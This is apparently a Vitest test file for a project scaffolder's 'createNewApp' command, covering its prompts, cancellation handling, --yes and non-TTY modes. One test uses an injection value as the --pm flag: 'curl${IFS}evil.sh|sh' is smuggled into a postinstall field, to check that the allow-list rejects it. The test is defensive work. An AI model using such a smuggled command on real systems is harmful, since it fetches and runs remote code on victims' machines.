import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

import type { App } from "../src/helpers/app";

/**
 * End-to-end coverage of the scaffolder's command entry (`createNewApp`) with
 * every side-effecting collaborator mocked: the @clack prompts, the package
 * manager probes, the app path reservation, and crucially `createWarlockApp`
 * (the real installer) so NOTHING spawns a process or touches the disk.
 *
 * The strategy: each prompt mock pulls its next answer from a queue the test
 * primes, mirroring a user clicking through the wizard. `isCancel` recognises a
 * single shared sentinel so cancellation can be injected at any step.
 */

const CANCEL = Symbol("clack.cancel");

// --- @clack/prompts ----------------------------------------------------------
const text = vi.fn();
const select = vi.fn();
const multiselect = vi.fn();
const confirm = vi.fn();
const cancel = vi.fn();

vi.mock("@clack/prompts", () => ({
  text: (...args: unknown[]) => text(...args),
  select: (...args: unknown[]) => select(...args),
  multiselect: (...args: unknown[]) => multiselect(...args),
  confirm: (...args: unknown[]) => confirm(...args),
  cancel: (...args: unknown[]) => cancel(...args),
  isCancel: (value: unknown) => value === CANCEL,
  // spinner/log are pulled in transitively by create-warlock-app, but that
  // module is mocked below, so these are only here for completeness.
  spinner: () => ({ start: vi.fn(), stop: vi.fn() }),
  log: { error: vi.fn() },
}));

// --- @warlock.js/fs (version read) ------------------------------------------
vi.mock("@warlock.js/fs", () => ({
  getJsonFile: () => ({ version: "9.9.9" }),
}));

// --- banner (silence the ASCII art) -----------------------------------------
vi.mock("../src/ui/banner", () => ({
  showIntroBanner: vi.fn(),
}));

// --- package manager ---------------------------------------------------------
const detectPackageManagers = vi.fn(async () => undefined);
const getSystemPackageManagers = vi.fn(() => ["npm", "yarn", "pnpm"]);
const getPreferredPackageManager = vi.fn(() => "yarn");
const setPackageManager = vi.fn();
const getPackageManager = vi.fn(() => "yarn");

vi.mock("../src/helpers/package-manager", () => {
  const allowed = ["npm", "yarn", "pnpm", "bun"];

  return {
    detectPackageManagers: (...args: unknown[]) =>
      detectPackageManagers(...args),
    getSystemPackageManagers: (...args: unknown[]) =>
      getSystemPackageManagers(...args),
    getPreferredPackageManager: (...args: unknown[]) =>
      getPreferredPackageManager(...args),
    setPackageManager: (...args: unknown[]) => setPackageManager(...args),
    getPackageManager: (...args: unknown[]) => getPackageManager(...args),
    ALLOWED_PACKAGE_MANAGERS: allowed,
    isValidPackageManager: (value: string) => allowed.includes(value),
  };
});

// --- app path reservation ----------------------------------------------------
const getAppPath = vi.fn(() => "/tmp/reserved-app");

vi.mock("../src/commands/create-new-app/get-app-path", () => ({
  default: (...args: unknown[]) => getAppPath(...args),
}));

// --- TTY detection -------------------------------------------------------
// Defaults to "interactive" (a real terminal) so every existing prompt-driven
// test below keeps exercising the prompt flow. Individual tests flip this to
// simulate the no-TTY case (CI, a script, an agent harness) WITHOUT relying on
// this test runner's own stdin, which is not a TTY either — the whole point
// of mocking it.
const hasInteractiveStdin = vi.fn(() => true);

vi.mock("../src/helpers/tty", () => ({
  hasInteractiveStdin: (...args: unknown[]) => hasInteractiveStdin(...args),
}));

// --- the installer we must NEVER actually run -------------------------------
const createWarlockApp = vi.fn(async () => undefined);

vi.mock("../src/commands/create-warlock-app", () => ({
  createWarlockApp: (...args: unknown[]) => createWarlockApp(...args),
}));

import createNewApp from "../src/commands/create-new-app";

class ProcessExit extends Error {
  public constructor(public code?: number) {
    super(`process.exit(${code})`);
  }
}

let exitSpy: ReturnType<typeof vi.spyOn>;
let logSpy: ReturnType<typeof vi.spyOn>;

/**
 * Read the `App` descriptor that was handed to the (mocked) installer so tests
 * can assert on the assembled selections.
 */
function capturedApp(): App {
  expect(createWarlockApp).toHaveBeenCalledTimes(1);
  return createWarlockApp.mock.calls[0][0] as App;
}

beforeEach(() => {
  vi.clearAllMocks();
  // `clearAllMocks` clears recorded CALLS but not a pending
  // `mockResolvedValueOnce` queue — so a test that primes an answer it never
  // consumes silently hands that answer to the NEXT test, which then fails
  // somewhere unrelated. Drain the prompt queues explicitly.
  [text, select, multiselect, confirm].forEach(mock => mock.mockReset());
  // Re-seed the defaults the mocks lost on clear.
  getSystemPackageManagers.mockReturnValue(["npm", "yarn", "pnpm"]);
  getPreferredPackageManager.mockReturnValue("yarn");
  getPackageManager.mockReturnValue("yarn");
  getAppPath.mockReturnValue("/tmp/reserved-app");
  detectPackageManagers.mockResolvedValue(undefined);
  createWarlockApp.mockResolvedValue(undefined);
  hasInteractiveStdin.mockReturnValue(true);

  exitSpy = vi.spyOn(process, "exit").mockImplementation((code?: number) => {
    throw new ProcessExit(code);
  });
  logSpy = vi.spyOn(console, "log").mockImplementation(() => undefined);
});

afterEach(() => {
  exitSpy.mockRestore();
  logSpy.mockRestore();
});

/**
 * Prime the six interactive prompts (name, pm, db, features, ai, git, jwt) with
 * happy-path answers. Overrides replace individual steps.
 */
function primeHappyPath(
  overrides: {
    name?: unknown;
    pm?: unknown;
    db?: unknown;
    features?: unknown;
    ai?: unknown;
    git?: unknown;
    jwt?: unknown;
  } = {},
) {
  text.mockResolvedValueOnce(overrides.name ?? "my-warlock-app");
  select
    .mockResolvedValueOnce(overrides.pm ?? "yarn") // package manager
    .mockResolvedValueOnce(overrides.db ?? "postgres"); // database driver
  multiselect
    .mockResolvedValueOnce(overrides.features ?? ["test"]) // features
    .mockResolvedValueOnce(overrides.ai ?? ["openai"]); // ai providers
  confirm
    .mockResolvedValueOnce(overrides.git ?? true) // git
    .mockResolvedValueOnce(overrides.jwt ?? true); // jwt
}

describe("createNewApp — preamble guards", () => {
  it("shows the intro banner with the version read from package.json", async () => {
    primeHappyPath();

    await createNewApp({ interactive: true });

    const { showIntroBanner } = await import("../src/ui/banner");
    expect(showIntroBanner).toHaveBeenCalledWith("9.9.9");
  });

  it("refuses to run on Node older than 20 and exits 0", async () => {
    const descriptor = Object.getOwnPropertyDescriptor(
      process.versions,
      "node",
    );
    Object.defineProperty(process.versions, "node", {
      value: "18.20.0",
      configurable: true,
    });

    try {
      await expect(createNewApp({ yes: true, name: "app" })).rejects.toThrow(
        ProcessExit,
      );
      expect(cancel).toHaveBeenCalledWith(
        "Node.js version must be at least 20.0.0",
      );
      // The guard precedes the non-interactive branch, so nothing is built.
      expect(createWarlockApp).not.toHaveBeenCalled();
    } finally {
      if (descriptor) {
        Object.defineProperty(process.versions, "node", descriptor);
      }
    }
  });
});

describe("createNewApp — interactive flow", () => {
  it("assembles the full app descriptor from the prompt answers", async () => {
    primeHappyPath();

    await createNewApp({ interactive: true });

    const app = capturedApp();
    expect(app.name).toBe("my-warlock-app");
    expect(app.path).toBe("/tmp/reserved-app");
    expect(app.options.databaseDriver).toBe("postgres");
    expect(app.options.databasePort).toBe(5432);
    expect(app.options.features).toEqual(["test"]);
    expect(app.options.aiProviders).toEqual(["openai"]);
    expect(app.options.useGit).toBe(true);
    expect(app.options.useJWT).toBe(true);
  });

  it("defaults the database port to 27017 for the mongodb driver", async () => {
    primeHappyPath({ db: "mongodb" });

    await createNewApp({ interactive: true });

    expect(capturedApp().options.databasePort).toBe(27017);
  });

  it("commits the chosen package manager through setPackageManager", async () => {
    primeHappyPath({ pm: "pnpm" });

    await createNewApp({ interactive: true });

    expect(setPackageManager).toHaveBeenCalledWith("pnpm");
  });

  it("awaits package-manager detection before listing options", async () => {
    primeHappyPath();

    await createNewApp({ interactive: true });

    expect(detectPackageManagers).toHaveBeenCalled();
    expect(getSystemPackageManagers).toHaveBeenCalled();
  });

  it("reserves the app path from the typed project name", async () => {
    primeHappyPath({ name: "shop-api" });

    await createNewApp({ interactive: true });

    expect(getAppPath).toHaveBeenCalledWith("shop-api");
  });

  it("treats useGit=false / useJWT=false when the user declines", async () => {
    primeHappyPath({ git: false, jwt: false });

    await createNewApp({ interactive: true });

    const app = capturedApp();
    expect(app.options.useGit).toBe(false);
    expect(app.options.useJWT).toBe(false);
  });

  it("allows an empty feature and AI selection", async () => {
    primeHappyPath({ features: [], ai: [] });

    await createNewApp({ interactive: true });

    const app = capturedApp();
    expect(app.options.features).toEqual([]);
    expect(app.options.aiProviders).toEqual([]);
  });
});

describe("createNewApp — cancellation guards", () => {
  it("aborts when the project name is cancelled", async () => {
    text.mockResolvedValueOnce(CANCEL);

    await expect(createNewApp({ interactive: true })).rejects.toThrow(ProcessExit);
    expect(cancel).toHaveBeenCalledWith(
      "A project name is required to continue",
    );
    expect(createWarlockApp).not.toHaveBeenCalled();
  });

  it("aborts when the project name is blank (whitespace only)", async () => {
    text.mockResolvedValueOnce("   ");

    await expect(createNewApp({ interactive: true })).rejects.toThrow(ProcessExit);
    expect(cancel).toHaveBeenCalledWith(
      "A project name is required to continue",
    );
    expect(createWarlockApp).not.toHaveBeenCalled();
  });

  it("stops without exiting when getAppPath returns falsy (collision already handled)", async () => {
    text.mockResolvedValueOnce("my-app");
    getAppPath.mockReturnValue(undefined as unknown as string);

    await createNewApp({ interactive: true });

    // getAppPath owns the exit on collision; createNewApp just returns early.
    expect(createWarlockApp).not.toHaveBeenCalled();
    expect(select).not.toHaveBeenCalled();
  });

  it("aborts when the package manager step is cancelled", async () => {
    text.mockResolvedValueOnce("my-app");
    select.mockResolvedValueOnce(CANCEL);

    await expect(createNewApp({ interactive: true })).rejects.toThrow(ProcessExit);
    expect(cancel).toHaveBeenCalledWith("Package manager selection cancelled");
    expect(setPackageManager).not.toHaveBeenCalled();
  });

  it("aborts when the database step is cancelled", async () => {
    text.mockResolvedValueOnce("my-app");
    select.mockResolvedValueOnce("yarn").mockResolvedValueOnce(CANCEL);

    await expect(createNewApp({ interactive: true })).rejects.toThrow(ProcessExit);
    expect(cancel).toHaveBeenCalledWith("Database selection cancelled");
  });

  it("aborts when the features step is cancelled", async () => {
    text.mockResolvedValueOnce("my-app");
    select.mockResolvedValueOnce("yarn").mockResolvedValueOnce("mongodb");
    multiselect.mockResolvedValueOnce(CANCEL);

    await expect(createNewApp({ interactive: true })).rejects.toThrow(ProcessExit);
    expect(cancel).toHaveBeenCalledWith("Feature selection cancelled");
  });

  it("aborts when the AI providers step is cancelled", async () => {
    text.mockResolvedValueOnce("my-app");
    select.mockResolvedValueOnce("yarn").mockResolvedValueOnce("mongodb");
    multiselect.mockResolvedValueOnce(["test"]).mockResolvedValueOnce(CANCEL);

    await expect(createNewApp({ interactive: true })).rejects.toThrow(ProcessExit);
    expect(cancel).toHaveBeenCalledWith("AI provider selection cancelled");
  });

  it("known bug: a cancelled git confirm is NOT caught — it silently becomes useGit=false", async () => {
    // known bug: useGit = (await confirm()) === true runs BEFORE isCancel(useGit),
    // so the CANCEL symbol is coerced to `false` and isCancel(false) never fires.
    // The wizard therefore proceeds instead of aborting on a cancelled git prompt.
    text.mockResolvedValueOnce("my-app");
    select.mockResolvedValueOnce("yarn").mockResolvedValueOnce("mongodb");
    multiselect.mockResolvedValueOnce(["test"]).mockResolvedValueOnce([]);
    // First confirm (git) is cancelled; second confirm (jwt) falls back to the
    // default mock (undefined) -> useJWT false. No cancel guard trips.
    confirm.mockResolvedValueOnce(CANCEL);

    await createNewApp({ interactive: true });

    expect(cancel).not.toHaveBeenCalled();
    const app = capturedApp();
    expect(app.options.useGit).toBe(false);
    expect(app.options.useJWT).toBe(false);
  });

  it("known bug: a cancelled jwt confirm is NOT caught — it silently becomes useJWT=false", async () => {
    // known bug: same `=== true` coercion swallows the CANCEL symbol on the JWT
    // confirm, so the flow completes with useJWT=false instead of aborting.
    text.mockResolvedValueOnce("my-app");
    select.mockResolvedValueOnce("yarn").mockResolvedValueOnce("mongodb");
    multiselect.mockResolvedValueOnce(["test"]).mockResolvedValueOnce([]);
    confirm.mockResolvedValueOnce(true).mockResolvedValueOnce(CANCEL);

    await createNewApp({ interactive: true });

    expect(cancel).not.toHaveBeenCalled();
    const app = capturedApp();
    expect(app.options.useGit).toBe(true);
    expect(app.options.useJWT).toBe(false);
  });

  it("treats a non-true git answer as useGit=false (only strict true enables git)", async () => {
    // confirm returns `false` -> `=== true` is false -> useGit false, no cancel.
    primeHappyPath({ git: false });

    await createNewApp({ interactive: true });

    expect(capturedApp().options.useGit).toBe(false);
    expect(cancel).not.toHaveBeenCalled();
  });
});

describe("createNonInteractive (--yes)", () => {
  it("builds the descriptor straight from flags with no prompts", async () => {
    await createNewApp({
      yes: true,
      name: "flagged-app",
      db: "postgres",
      features: ["test", "herald"],
      ai: ["ai-openai", "ai-anthropic"],
      pm: "pnpm",
      git: true,
      jwt: true,
    });

    expect(text).not.toHaveBeenCalled();
    expect(select).not.toHaveBeenCalled();

    const app = capturedApp();
    expect(app.name).toBe("flagged-app");
    expect(app.options.databaseDriver).toBe("postgres");
    expect(app.options.databasePort).toBe(5432);
    expect(app.options.features).toEqual(["test", "herald"]);
    expect(app.options.aiProviders).toEqual(["ai-openai", "ai-anthropic"]);
    expect(app.options.useGit).toBe(true);
    expect(app.options.useJWT).toBe(true);
    expect(setPackageManager).toHaveBeenCalledWith("pnpm");
  });

  it("defaults db to mongodb and git/jwt to false when flags are omitted", async () => {
    await createNewApp({ yes: true, name: "minimal" });

    const app = capturedApp();
    expect(app.options.databaseDriver).toBe("mongodb");
    expect(app.options.databasePort).toBe(27017);
    expect(app.options.features).toEqual([]);
    expect(app.options.aiProviders).toEqual([]);
    expect(app.options.useGit).toBe(false);
    expect(app.options.useJWT).toBe(false);
  });

  it("falls back to the preferred package manager when --pm is absent", async () => {
    getPreferredPackageManager.mockReturnValue("yarn");

    await createNewApp({ yes: true, name: "app" });

    expect(setPackageManager).toHaveBeenCalledWith("yarn");
  });

  it("exits 1 when --yes is given without a project name", async () => {
    await expect(createNewApp({ yes: true })).rejects.toThrow(ProcessExit);
    expect(cancel).toHaveBeenCalledWith(expect.stringContaining("--yes"));
    expect(cancel).toHaveBeenCalledWith(expect.stringContaining("--name="));
    expect(exitSpy).toHaveBeenCalledWith(1);
  });

  it("exits 1 when --yes is given with a whitespace-only name", async () => {
    await expect(createNewApp({ yes: true, name: "   " })).rejects.toThrow(
      ProcessExit,
    );
    expect(cancel).toHaveBeenCalledWith(expect.stringContaining("--yes"));
  });

  it("accepts every allow-listed --pm value", async () => {
    for (const pm of ["npm", "yarn", "pnpm", "bun"]) {
      setPackageManager.mockClear();
      cancel.mockClear();

      await createNewApp({ yes: true, name: "app", pm });

      expect(cancel).not.toHaveBeenCalled();
      expect(setPackageManager).toHaveBeenCalledWith(pm);
    }
  });

  it("exits 1 on a --pm value outside the allow-list instead of reaching setPackageManager", async () => {
    await expect(
      createNewApp({
        yes: true,
        name: "app",
        pm: 'pnpm","postinstall":"curl${IFS}evil.sh|sh#',
      }),
    ).rejects.toThrow(ProcessExit);

    expect(cancel).toHaveBeenCalledWith(
      expect.stringContaining("Unknown package manager"),
    );
    expect(setPackageManager).not.toHaveBeenCalled();
    expect(createWarlockApp).not.toHaveBeenCalled();
    expect(exitSpy).toHaveBeenCalledWith(1);
  });

  it("exits 1 on an unknown database driver", async () => {
    await expect(
      createNewApp({ yes: true, name: "app", db: "oracle" }),
    ).rejects.toThrow(ProcessExit);
    expect(cancel).toHaveBeenCalledWith('Unknown database driver "oracle"');
    expect(createWarlockApp).not.toHaveBeenCalled();
  });

  it("exits 1 listing every unknown feature / provider key", async () => {
    await expect(
      createNewApp({
        yes: true,
        name: "app",
        features: ["test", "bogus"],
        ai: ["openai", "nope"],
      }),
    ).rejects.toThrow(ProcessExit);

    expect(cancel).toHaveBeenCalledTimes(1);
    const message = String(cancel.mock.calls[0][0]);
    expect(message).toContain("bogus");
    expect(message).toContain("nope");
    expect(createWarlockApp).not.toHaveBeenCalled();
  });

  it("accepts the full known feature + provider + package set without complaint", async () => {
    await createNewApp({
      yes: true,
      name: "app",
      features: ["react", "test", "redis"],
      ai: [
        "ai-openai",
        "ai-google",
        "ai-anthropic",
        "ai-bedrock",
        "ai-ollama",
        "ai-tools",
        "ai-panoptic",
        "ai-workspace",
      ],
    });

    expect(cancel).not.toHaveBeenCalled();
    expect(createWarlockApp).toHaveBeenCalledTimes(1);
  });

  it("returns early (no exit) when getAppPath yields falsy in non-interactive mode", async () => {
    getAppPath.mockReturnValue(undefined as unknown as string);

    await createNewApp({ yes: true, name: "app" });

    // getAppPath returns falsy AFTER the top-level detection kicks off but BEFORE
    // the package manager is committed, so the installer never runs and no
    // package manager is set.
    expect(createWarlockApp).not.toHaveBeenCalled();
    expect(setPackageManager).not.toHaveBeenCalled();
  });

  it("routes through createNonInteractive and never touches the prompt fns", async () => {
    await createNewApp({ yes: true, name: "app", db: "mongodb" });

    expect(text).not.toHaveBeenCalled();
    expect(multiselect).not.toHaveBeenCalled();
    expect(confirm).not.toHaveBeenCalled();
    expect(createWarlockApp).toHaveBeenCalledTimes(1);
  });
});

describe("createNewApp — non-TTY stdin (no keyboard to prompt at)", () => {
  it("proceeds non-interactively with no --yes, once a name is available, without ever calling a prompt", async () => {
    hasInteractiveStdin.mockReturnValue(false);

    await createNewApp({ name: "ci-app", features: ["test"] });

    expect(text).not.toHaveBeenCalled();
    expect(select).not.toHaveBeenCalled();
    expect(multiselect).not.toHaveBeenCalled();
    expect(confirm).not.toHaveBeenCalled();

    const app = capturedApp();
    expect(app.name).toBe("ci-app");
    expect(app.options.features).toEqual(["test"]);
    // Same defaults --yes documents: mongodb, no git, no jwt.
    expect(app.options.databaseDriver).toBe("mongodb");
    expect(app.options.useGit).toBe(false);
    expect(app.options.useJWT).toBe(false);
  });

  it("produces the identical descriptor as the equivalent --yes invocation (one path, not two)", async () => {
    const flags = {
      db: "postgres",
      features: ["test", "herald"],
      ai: ["ai-openai"],
      pm: "pnpm",
      git: true,
      jwt: true,
    } as const;

    hasInteractiveStdin.mockReturnValue(true);
    await createNewApp({ ...flags, yes: true, name: "twin-a" });
    const viaYes = capturedApp();

    vi.clearAllMocks();
    getSystemPackageManagers.mockReturnValue(["npm", "yarn", "pnpm"]);
    getPreferredPackageManager.mockReturnValue("yarn");
    getPackageManager.mockReturnValue("yarn");
    getAppPath.mockReturnValue("/tmp/reserved-app");
    detectPackageManagers.mockResolvedValue(undefined);
    createWarlockApp.mockResolvedValue(undefined);

    hasInteractiveStdin.mockReturnValue(false);
    await createNewApp({ ...flags, name: "twin-a" });
    const viaNoTty = capturedApp();

    expect(viaNoTty.options).toEqual(viaYes.options);
  });

  it("fails BEFORE any prompt is attempted, naming --yes and --name, when no name is available either — never a libuv crash", async () => {
    hasInteractiveStdin.mockReturnValue(false);

    await expect(createNewApp({})).rejects.toThrow(ProcessExit);

    expect(text).not.toHaveBeenCalled();
    expect(select).not.toHaveBeenCalled();
    expect(multiselect).not.toHaveBeenCalled();
    expect(confirm).not.toHaveBeenCalled();

    const message = String(cancel.mock.calls[0][0]);
    expect(message).toContain("--yes");
    expect(message).toContain("--name=");
    expect(message).not.toContain("uv_tty_init");
    expect(exitSpy).toHaveBeenCalledWith(1);
    expect(createWarlockApp).not.toHaveBeenCalled();
  });

  it("--interactive still runs the full wizard when a TTY IS present and --yes was not passed, even if flags are given", async () => {
    hasInteractiveStdin.mockReturnValue(true);
    primeHappyPath({ name: "interactive-app" });

    await createNewApp({ interactive: true });

    expect(text).toHaveBeenCalledTimes(1);
    expect(capturedApp().name).toBe("interactive-app");
    // Still the full wizard: every other question was asked too.
    expect(multiselect).toHaveBeenCalledTimes(2);
    expect(confirm).toHaveBeenCalledTimes(2);
  });

  /**
   * Every one of these used to resolve in SILENCE: --yes won the branch above
   * and --customize was dropped without a word, so the run looked like it had
   * succeeded while asking none of the questions the flag was passed for.
   */
  it("refuses --customize together with --yes, naming both flags", async () => {
    hasInteractiveStdin.mockReturnValue(true);

    await expect(
      createNewApp({ interactive: true, yes: true, name: "x" }),
    ).rejects.toThrow(ProcessExit);

    const message = String(cancel.mock.calls[0][0]);
    expect(message).toContain("--customize");
    expect(message).toContain("--yes");
    expect(exitSpy).toHaveBeenCalledWith(1);
    expect(createWarlockApp).not.toHaveBeenCalled();
    expect(select).not.toHaveBeenCalled();
  });

  it("refuses --customize when stdin is not a TTY, instead of silently scaffolding defaults", async () => {
    hasInteractiveStdin.mockReturnValue(false);

    await expect(
      createNewApp({ interactive: true, name: "x" }),
    ).rejects.toThrow(ProcessExit);

    const message = String(cancel.mock.calls[0][0]);
    expect(message).toContain("--customize");
    expect(message).toContain("TTY");
    expect(exitSpy).toHaveBeenCalledWith(1);
    expect(createWarlockApp).not.toHaveBeenCalled();
  });

  it("refuses --customize together with --stack, which the wizard would drop", async () => {
    hasInteractiveStdin.mockReturnValue(true);

    await expect(
      createNewApp({ interactive: true, stack: "web", name: "x" }),
    ).rejects.toThrow(ProcessExit);

    const message = String(cancel.mock.calls[0][0]);
    expect(message).toContain("--customize");
    expect(message).toContain("--stack");
    expect(exitSpy).toHaveBeenCalledWith(1);
    expect(createWarlockApp).not.toHaveBeenCalled();
  });

  it("--interactive does NOT re-ask for a name that was already given on the command line", async () => {
    hasInteractiveStdin.mockReturnValue(true);
    primeHappyPath();

    await createNewApp({ interactive: true, name: "named-on-the-cli" });

    expect(text).not.toHaveBeenCalled();
    expect(capturedApp().name).toBe("named-on-the-cli");
    // The rest of the wizard still runs — only the answered question is skipped.
    expect(multiselect).toHaveBeenCalledTimes(2);
    expect(confirm).toHaveBeenCalledTimes(2);
  });
});

describe("createNewApp — default TTY path (at most one structural question)", () => {
  /**
   * With a TTY present but neither `--yes` nor `--interactive`/`--customize`,
   * the default path must ask AT MOST ONE question — the structural
   * API-only vs full-stack-web fork — and take every other answer from a
   * flag or its default, exactly like the non-interactive path.
   */
  beforeEach(() => {
    hasInteractiveStdin.mockReturnValue(true);
  });

  it("asks only the stack question when the project name is already known", async () => {
    select.mockResolvedValueOnce("api");

    await createNewApp({ name: "default-app" });

    expect(text).not.toHaveBeenCalled();
    expect(select).toHaveBeenCalledTimes(1);
    expect(multiselect).not.toHaveBeenCalled();
    expect(confirm).not.toHaveBeenCalled();

    const app = capturedApp();
    expect(app.name).toBe("default-app");
    expect(app.options.databaseDriver).toBe("mongodb");
    expect(app.options.features).toEqual([]);
    expect(app.options.agents).toEqual(["claude"]);
    expect(app.options.useGit).toBe(false);
    expect(app.options.useJWT).toBe(false);
  });

  it("prompts for the project name first when it is missing, still asking only one further question", async () => {
    text.mockResolvedValueOnce("typed-app");
    select.mockResolvedValueOnce("api");

    await createNewApp({});

    expect(text).toHaveBeenCalledTimes(1);
    expect(select).toHaveBeenCalledTimes(1);
    expect(capturedApp().name).toBe("typed-app");
  });

  it('offers "Customize" as a third entry in the structural question', async () => {
    select.mockResolvedValueOnce("api");

    await createNewApp({ name: "menu-app" });

    const options = (
      select.mock.calls[0][0] as { options: { value: string }[] }
    ).options;

    expect(options.map(option => option.value)).toEqual([
      "api",
      "web",
      "customize",
    ]);
  });

  it('picking "Customize" from the menu hands over to the full wizard without re-asking the name', async () => {
    text.mockResolvedValueOnce("menu-app");
    select
      .mockResolvedValueOnce("customize") // the structural question
      .mockResolvedValueOnce("yarn") // wizard: package manager
      .mockResolvedValueOnce("postgres"); // wizard: database driver
    multiselect
      .mockResolvedValueOnce(["test"]) // wizard: features
      .mockResolvedValueOnce(["openai"]); // wizard: ai providers
    confirm
      .mockResolvedValueOnce(true) // wizard: git
      .mockResolvedValueOnce(true); // wizard: jwt

    await createNewApp({});

    // The name was asked ONCE, by the default path, and carried into the wizard.
    expect(text).toHaveBeenCalledTimes(1);

    const app = capturedApp();
    expect(app.name).toBe("menu-app");
    // Answers came from the wizard's prompts, not the non-interactive defaults:
    // mongodb/[]/false is what the default path would have produced.
    expect(app.options.databaseDriver).toBe("postgres");
    expect(app.options.features).toEqual(["test"]);
    expect(app.options.aiProviders).toEqual(["openai"]);
    expect(app.options.useGit).toBe(true);
    expect(app.options.useJWT).toBe(true);
  });

  it("asks nothing at all when --stack is also already answered by a flag", async () => {
    await createNewApp({ name: "flagged-app", stack: "api" });

    expect(text).not.toHaveBeenCalled();
    expect(select).not.toHaveBeenCalled();
    expect(multiselect).not.toHaveBeenCalled();
    expect(confirm).not.toHaveBeenCalled();
  });

  it("includes the web feature by default when the structural answer is web", async () => {
    await createNewApp({ name: "web-app", stack: "web" });

    expect(capturedApp().options.features).toEqual(["web"]);
  });

  it("still honors an explicit --features over the stack's implicit default", async () => {
    await createNewApp({ name: "web-app", stack: "web", features: ["test"] });

    expect(capturedApp().options.features).toEqual(["test"]);
  });

  it("resolves the package manager, database, and agents from flags without prompting for them", async () => {
    await createNewApp({
      name: "flagged-app",
      stack: "api",
      pm: "pnpm",
      db: "postgres",
      agents: ["claude"],
    });

    expect(setPackageManager).toHaveBeenCalledWith("pnpm");
    const app = capturedApp();
    expect(app.options.databaseDriver).toBe("postgres");
    expect(app.options.agents).toEqual(["claude"]);
  });
});
